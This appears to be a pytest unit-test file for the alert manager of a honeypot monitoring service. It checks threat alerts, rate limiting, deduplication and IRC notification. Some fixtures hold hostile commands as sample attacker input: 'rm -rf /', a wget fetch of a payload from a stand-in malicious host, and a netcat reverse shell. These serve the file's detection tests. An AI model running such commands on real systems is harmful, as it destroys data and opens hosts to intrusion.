"""
Unit tests for alert manager service.
"""

import pytest
from unittest.mock import Mock, patch
from datetime import datetime, timedelta

from src.honeypot_monitor.services.alert_manager import AlertManager
from src.honeypot_monitor.services.threat_analyzer import ThreatAnalyzer
from src.honeypot_monitor.services.irc_notifier import IRCNotifier
from src.honeypot_monitor.models.log_entry import LogEntry
from src.honeypot_monitor.models.threat_assessment import ThreatAssessment
from src.honeypot_monitor.models.irc_alert import IRCAlert
from src.honeypot_monitor.config.settings import AnalysisSettings


class TestAlertManager:
    """Test cases for AlertManager class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        # Create mock dependencies
        self.mock_settings = Mock(spec=AnalysisSettings)
        self.mock_threat_analyzer = Mock(spec=ThreatAnalyzer)
        self.mock_irc_notifier = Mock(spec=IRCNotifier)
        
        # Configure mock IRC notifier
        self.mock_irc_notifier.is_connected.return_value = True
        self.mock_irc_notifier.send_alert.return_value = True
        
        # Create alert manager
        self.alert_manager = AlertManager(
            threat_analyzer=self.mock_threat_analyzer,
            irc_notifier=self.mock_irc_notifier,
            alert_threshold='medium',
            rate_limit_window=300,
            max_alerts_per_ip=3
        )
    
    def test_initialization(self):
        """Test AlertManager initialization."""
        assert self.alert_manager.threat_analyzer == self.mock_threat_analyzer
        assert self.alert_manager.irc_notifier == self.mock_irc_notifier
        assert self.alert_manager.alert_threshold == 'medium'
        assert self.alert_manager.threshold_level == 2
        assert len(self.alert_manager.seen_hosts) == 0
        assert len(self.alert_manager.alert_history) == 0
    
    def test_initialization_without_irc(self):
        """Test AlertManager initialization without IRC notifier."""
        manager = AlertManager(
            threat_analyzer=self.mock_threat_analyzer,
            irc_notifier=None
        )
        
        assert manager.irc_notifier is None
        assert manager.threat_analyzer == self.mock_threat_analyzer
    
    def test_process_log_entry_new_host(self):
        """Test processing log entry for new host detection."""
        # Create test log entry
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='login',
            source_ip='192.168.1.100',
            message='User login attempt'
        )
        
        # Mock threat analyzer response
        threat_assessment = ThreatAssessment(
            severity='low',
            category='reconnaissance',
            confidence=0.5,
            indicators=['Login attempt'],
            recommended_action='Monitor'
        )
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = []
        
        # Process entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Should generate new host alert
        assert len(alerts) == 1
        assert alerts[0].alert_type == 'new_host'
        assert alerts[0].source_ip == '192.168.1.100'
        assert '192.168.1.100' in self.alert_manager.seen_hosts
        
        # Verify IRC notifier was called
        self.mock_irc_notifier.send_alert.assert_called_once()
    
    def test_process_log_entry_threat_detection(self):
        """Test processing log entry for threat detection."""
        # Add IP to seen hosts to avoid new host alert
        self.alert_manager.seen_hosts.add('192.168.1.100')
        
        # Create test log entry
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Command executed',
            command='rm -rf /'
        )
        
        # Mock threat analyzer response with high severity
        threat_assessment = ThreatAssessment(
            severity='critical',
            category='exploitation',
            confidence=0.9,
            indicators=['Destructive command'],
            recommended_action='Immediate investigation'
        )
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = []
        
        # Process entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Should generate threat alert
        assert len(alerts) == 1
        assert alerts[0].alert_type == 'high_threat'
        assert alerts[0].severity == 'critical'
        assert 'exploitation' in alerts[0].message.lower()
    
    def test_process_log_entry_interesting_traffic(self):
        """Test processing log entry for interesting traffic detection."""
        # Set lower threshold to allow interesting traffic alerts
        self.alert_manager.alert_threshold = 'low'
        self.alert_manager.threshold_level = 1
        
        # Add IP to seen hosts
        self.alert_manager.seen_hosts.add('192.168.1.100')
        
        # Create test log entry with interesting command
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Command executed',
            command='wget http://malicious.com/payload.sh'
        )
        
        # Mock threat analyzer response with low severity
        threat_assessment = ThreatAssessment(
            severity='low',
            category='reconnaissance',
            confidence=0.5,
            indicators=['Command execution'],
            recommended_action='Monitor'
        )
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = []
        
        # Process entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Should generate both threat and interesting traffic alerts
        assert len(alerts) == 2
        
        # Check that we have both alert types
        alert_types = [alert.alert_type for alert in alerts]
        assert 'high_threat' in alert_types
        assert 'interesting_traffic' in alert_types
        
        # Find the interesting traffic alert
        interesting_alert = next(alert for alert in alerts if alert.alert_type == 'interesting_traffic')
        assert 'download attempt' in interesting_alert.message.lower()
    
    def test_process_log_entry_custom_rules(self):
        """Test processing log entry with custom rule alerts."""
        # Add IP to seen hosts
        self.alert_manager.seen_hosts.add('192.168.1.100')
        
        # Create test log entry
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Command executed',
            command='nc -e /bin/sh'
        )
        
        # Mock threat analyzer responses
        threat_assessment = ThreatAssessment(
            severity='low',
            category='reconnaissance',
            confidence=0.5,
            indicators=['Command execution'],
            recommended_action='Monitor'
        )
        custom_alert = {
            'rule_name': 'reverse_shell',
            'severity': 'critical',
            'confidence': 0.9,
            'description': 'Reverse shell detected',
            'timestamp': datetime.now(),
            'source_ip': '192.168.1.100'
        }
        
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = [custom_alert]
        
        # Process entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Should generate custom rule alert
        assert len(alerts) == 1
        assert alerts[0].alert_type == 'high_threat'
        assert alerts[0].severity == 'critical'
        assert 'reverse shell' in alerts[0].message.lower()
    
    def test_rate_limiting_by_ip(self):
        """Test rate limiting functionality by IP address."""
        # Create multiple log entries from same IP
        entries = []
        for i in range(5):
            entry = LogEntry(
                timestamp=datetime.now(),
                session_id=f'session-{i}',
                event_type='login',
                source_ip='192.168.1.100',
                message=f'Login attempt {i}'
            )
            entries.append(entry)
        
        # Mock threat analyzer
        threat_assessment = ThreatAssessment(
            severity='low',
            category='reconnaissance',
            confidence=0.5,
            indicators=['Login attempt'],
            recommended_action='Monitor'
        )
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = []
        
        # Process entries
        total_alerts = 0
        for entry in entries:
            alerts = self.alert_manager.process_log_entry(entry)
            total_alerts += len(alerts)
        
        # Should be rate limited after max_alerts_per_ip (3)
        # First entry generates new_host alert, but subsequent ones should be rate limited
        assert total_alerts <= 3
    
    def test_severity_threshold_filtering(self):
        """Test that alerts below threshold are not sent."""
        # Set high threshold
        self.alert_manager.alert_threshold = 'high'
        self.alert_manager.threshold_level = 3
        
        # Add IP to seen hosts
        self.alert_manager.seen_hosts.add('192.168.1.100')
        
        # Create test log entry
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Command executed',
            command='ls -la'
        )
        
        # Mock threat analyzer with medium severity (below threshold)
        threat_assessment = ThreatAssessment(
            severity='medium',
            category='reconnaissance',
            confidence=0.7,
            indicators=['Directory listing'],
            recommended_action='Monitor'
        )
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = []
        
        # Process entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Should not generate alerts due to threshold
        assert len(alerts) == 0
    
    def test_process_pattern_detection(self):
        """Test processing pattern detection results."""
        # Create test log entries
        entries = [
            LogEntry(
                timestamp=datetime.now(),
                session_id='test-session',
                event_type='authentication',
                source_ip='192.168.1.100',
                message='Failed login attempt'
            )
            for _ in range(10)
        ]
        
        # Mock pattern detection
        brute_force_pattern = {
            'type': 'brute_force_attack',
            'source_ip': '192.168.1.100',
            'severity': 'high',
            'confidence': 0.9,
            'description': 'Brute force attack detected',
            'entry_count': 10,
            'time_span': 120
        }
        self.mock_threat_analyzer.detect_patterns.return_value = [brute_force_pattern]
        
        # Process patterns
        alerts = self.alert_manager.process_pattern_detection(entries)
        
        # Should generate brute force alert
        assert len(alerts) == 1
        assert alerts[0].alert_type == 'high_threat'
        assert 'brute force' in alerts[0].message.lower()
        assert alerts[0].severity == 'high'
    
    def test_duplicate_alert_prevention(self):
        """Test prevention of duplicate alerts."""
        # Add IP to seen hosts
        self.alert_manager.seen_hosts.add('192.168.1.100')
        
        # Create identical log entries
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Command executed',
            command='rm -rf /'
        )
        
        # Mock threat analyzer
        threat_assessment = ThreatAssessment(
            severity='critical',
            category='exploitation',
            confidence=0.9,
            indicators=['Destructive command'],
            recommended_action='Immediate investigation'
        )
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = []
        
        # Process same entry multiple times
        alerts1 = self.alert_manager.process_log_entry(entry)
        alerts2 = self.alert_manager.process_log_entry(entry)
        
        # First should generate alert, second should be duplicate
        assert len(alerts1) == 1
        assert len(alerts2) == 0  # Duplicate prevention
    
    def test_callbacks(self):
        """Test callback functionality."""
        # Set up callbacks
        new_host_callback = Mock()
        threat_callback = Mock()
        interesting_callback = Mock()
        
        self.alert_manager.set_callbacks(
            on_new_host=new_host_callback,
            on_threat=threat_callback,
            on_interesting_traffic=interesting_callback
        )
        
        # Create test log entry
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Command executed',
            command='wget http://example.com/file'
        )
        
        # Mock threat analyzer
        threat_assessment = ThreatAssessment(
            severity='high',
            category='exploitation',
            confidence=0.8,
            indicators=['Download attempt'],
            recommended_action='Investigate'
        )
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = []
        
        # Process entry
        self.alert_manager.process_log_entry(entry)
        
        # Verify callbacks were called
        new_host_callback.assert_called_once_with('192.168.1.100', entry.timestamp)
        threat_callback.assert_called_once_with(threat_assessment, '192.168.1.100')
        interesting_callback.assert_called_once()
    
    def test_alert_statistics(self):
        """Test alert statistics generation."""
        # Add some test alerts to history
        now = datetime.now()
        test_alerts = [
            IRCAlert(
                alert_type='new_host',
                timestamp=now - timedelta(minutes=30),
                source_ip='192.168.1.100',
                message='New host detected',
                severity='medium'
            ),
            IRCAlert(
                alert_type='high_threat',
                timestamp=now - timedelta(hours=2),
                source_ip='192.168.1.101',
                message='Threat detected',
                severity='high'
            ),
            IRCAlert(
                alert_type='interesting_traffic',
                timestamp=now - timedelta(days=2),
                source_ip='192.168.1.102',
                message='Interesting activity',
                severity='low'
            )
        ]
        
        self.alert_manager.alert_history.extend(test_alerts)
        self.alert_manager.seen_hosts.update(['192.168.1.100', '192.168.1.101', '192.168.1.102'])
        
        # Get statistics
        stats = self.alert_manager.get_alert_statistics()
        
        # Verify statistics
        assert stats['total_alerts'] == 3
        assert stats['alerts_last_hour'] == 1
        assert stats['alerts_last_day'] == 2
        assert stats['unique_hosts_seen'] == 3
        assert 'new_host' in stats['alert_types']
        assert 'high_threat' in stats['alert_types']
        assert 'medium' in stats['severity_distribution']
    
    def test_irc_notifier_disconnected(self):
        """Test behavior when IRC notifier is disconnected."""
        # Configure IRC notifier as disconnected
        self.mock_irc_notifier.is_connected.return_value = False
        
        # Create test log entry
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='login',
            source_ip='192.168.1.100',
            message='Login attempt'
        )
        
        # Mock threat analyzer
        threat_assessment = ThreatAssessment(
            severity='high',
            category='exploitation',
            confidence=0.8,
            indicators=['Suspicious login'],
            recommended_action='Investigate'
        )
        self.mock_threat_analyzer.analyze_entry.return_value = threat_assessment
        self.mock_threat_analyzer.apply_custom_rules.return_value = []
        
        # Process entry
        alerts = self.alert_manager.process_log_entry(entry)
        
        # Should not send alerts when IRC is disconnected
        assert len(alerts) == 0
        self.mock_irc_notifier.send_alert.assert_not_called()
    
    def test_cleanup_old_alerts(self):
        """Test cleanup of old alerts."""
        # Add old alerts to history
        old_time = datetime.now() - timedelta(days=10)
        old_alerts = [
            IRCAlert(
                alert_type='new_host',
                timestamp=old_time,
                source_ip='192.168.1.100',
                message='Old alert',
                severity='low'
            )
            for _ in range(5)
        ]
        
        self.alert_manager.alert_history.extend(old_alerts)
        
        # Add recent alert
        recent_alert = IRCAlert(
            alert_type='new_host',
            timestamp=datetime.now(),
            source_ip='192.168.1.101',
            message='Recent alert',
            severity='medium'
        )
        self.alert_manager.alert_history.append(recent_alert)
        
        # Trigger cleanup
        self.alert_manager._cleanup_old_alerts()
        
        # Should only keep recent alerts
        assert len(self.alert_manager.alert_history) == 1
        assert self.alert_manager.alert_history[0].message == 'Recent alert'


class TestAlertManagerIntegration:
    """Integration tests for AlertManager."""
    
    def test_full_workflow_integration(self):
        """Test complete alert workflow integration."""
        # Create real threat analyzer with mock settings
        mock_settings = Mock(spec=AnalysisSettings)
        threat_analyzer = ThreatAnalyzer(mock_settings)
        
        # Create mock IRC notifier
        mock_irc_notifier = Mock(spec=IRCNotifier)
        mock_irc_notifier.is_connected.return_value = True
        mock_irc_notifier.send_alert.return_value = True
        
        # Create alert manager
        alert_manager = AlertManager(
            threat_analyzer=threat_analyzer,
            irc_notifier=mock_irc_notifier,
            alert_threshold='low'
        )
        
        # Create test log entry with suspicious command
        entry = LogEntry(
            timestamp=datetime.now(),
            session_id='test-session',
            event_type='command',
            source_ip='192.168.1.100',
            message='Command executed',
            command='rm -rf /'
        )
        
        # Process entry
        alerts = alert_manager.process_log_entry(entry)
        
        # Should generate alerts
        assert len(alerts) >= 1
        
        # Verify IRC notifier was called
        assert mock_irc_notifier.send_alert.call_count >= 1


if __name__ == '__main__':
    pytest.main([__file__])